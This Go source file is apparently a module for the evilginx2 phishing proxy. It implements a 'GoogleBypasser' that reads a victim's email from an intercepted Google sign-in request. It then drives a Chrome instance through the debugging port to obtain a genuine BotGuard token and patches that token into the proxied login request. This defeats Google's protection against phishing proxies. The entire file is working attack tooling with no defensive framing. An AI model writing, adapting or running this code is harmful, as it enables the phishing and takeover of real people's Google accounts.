package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/proto"
	"github.com/kgretzky/evilginx2/log"
)

var bgRegexp = regexp.MustCompile(`identity-signin-identifier\\",\\"([^"]+)`)

type GoogleBypasser struct {
	browser        *rod.Browser
	page           *rod.Page
	slowMotionTime time.Duration
	token          string
	email          string
}

func getWebSocketDebuggerURL() (string, error) {
	resp, err := http.Get("http://127.0.0.1:9222/json")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var targets []map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
		return "", err
	}
	if len(targets) == 0 {
		return "", fmt.Errorf("no chrome debug targets found on port 9222")
	}
	ws, ok := targets[0]["webSocketDebuggerUrl"].(string)
	if !ok || ws == "" {
		return "", fmt.Errorf("invalid websocket debugger URL")
	}
	return ws, nil
}

func (b *GoogleBypasser) Launch() {
	log.Debug("[GoogleBypasser]: connecting to Chrome on port 9222...")
	wsURL, err := getWebSocketDebuggerURL()
	if err != nil {
		log.Error("[GoogleBypasser]: %v", err)
		return
	}
	b.browser = rod.New().ControlURL(wsURL)
	if b.slowMotionTime > 0 {
		b.browser = b.browser.SlowMotion(b.slowMotionTime)
	}
	b.browser = b.browser.MustConnect()
	b.page = b.browser.MustPage()
}

func (b *GoogleBypasser) GetEmail(body []byte) {
	exp := regexp.MustCompile(`f\.req=\[\[\["V1UmUe","\[null,\\"(.*?)\\"`)
	emailMatch := exp.FindSubmatch(body)
	if len(emailMatch) < 2 {
		log.Debug("[GoogleBypasser]: email not found in request body")
		return
	}
	b.email = string(bytes.Replace(emailMatch[1], []byte("%40"), []byte("@"), -1))
	log.Debug("[GoogleBypasser]: using email: %s", b.email)
}

func (b *GoogleBypasser) GetToken() {
	stop := make(chan struct{})
	var once sync.Once
	timeout := time.After(200 * time.Second)

	go b.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		if strings.Contains(e.Request.URL, "/v3/signin/_/AccountsSignInUi/data/batchexecute?") &&
			strings.Contains(e.Request.URL, "rpcids=V1UmUe") {
			decodedBody, err := url.QueryUnescape(string(e.Request.PostData))
			if err != nil {
				log.Error("[GoogleBypasser]: decode body: %v", err)
				return
			}
			b.token = bgRegexp.FindString(decodedBody)
			once.Do(func() { close(stop) })
		}
	})()

	if err := b.page.Navigate("https://accounts.google.com/"); err != nil {
		log.Error("[GoogleBypasser]: navigate: %v", err)
		return
	}

	emailField := b.page.MustWaitLoad().MustElement("#identifierId")
	if err := emailField.Input(b.email); err != nil {
		log.Error("[GoogleBypasser]: input email: %v", err)
		return
	}
	if err := b.page.Keyboard.Press(input.Enter); err != nil {
		log.Error("[GoogleBypasser]: submit: %v", err)
		return
	}

	select {
	case <-stop:
		for b.token == "" {
			select {
			case <-time.After(1 * time.Second):
				log.Debug("[GoogleBypasser]: waiting for token...")
			case <-timeout:
				log.Warning("[GoogleBypasser]: timed out waiting for token")
				return
			}
		}
		_ = b.page.Close()
	case <-timeout:
		log.Warning("[GoogleBypasser]: timed out")
	}
}

func (b *GoogleBypasser) ReplaceTokenInBody(body []byte) []byte {
	if b.token == "" {
		return body
	}
	return []byte(bgRegexp.ReplaceAllString(string(body), b.token))
}

// PatchGoogleBotGuardToken replaces BotGuard tokens in Google batchexecute POST bodies.
func PatchGoogleBotGuardToken(body []byte) ([]byte, error) {
	decodedBody, err := url.QueryUnescape(string(body))
	if err != nil {
		return body, err
	}
	decodedBodyBytes := []byte(decodedBody)

	b := &GoogleBypasser{slowMotionTime: 1500}
	b.Launch()
	if b.browser == nil {
		return body, fmt.Errorf("chrome debugger not available on port 9222")
	}
	b.GetEmail(decodedBodyBytes)
	b.GetToken()
	decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)

	postForm, err := url.ParseQuery(string(decodedBodyBytes))
	if err != nil {
		return body, err
	}
	return []byte(postForm.Encode()), nil
}
